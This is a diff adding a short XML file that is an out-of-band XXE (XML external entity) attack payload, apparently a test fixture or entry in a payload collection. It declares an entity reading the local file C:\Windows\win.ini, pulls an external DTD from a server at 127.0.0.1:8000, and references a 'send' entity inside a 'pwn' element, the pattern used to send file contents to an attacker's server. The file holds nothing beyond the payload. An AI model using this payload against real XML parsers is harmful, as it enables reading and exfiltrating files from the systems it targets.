@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE test [
+<!ENTITY % file SYSTEM "C:\Windows\win.ini">
+<!ENTITY % dtd SYSTEM "http://127.0.0.1:8000/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
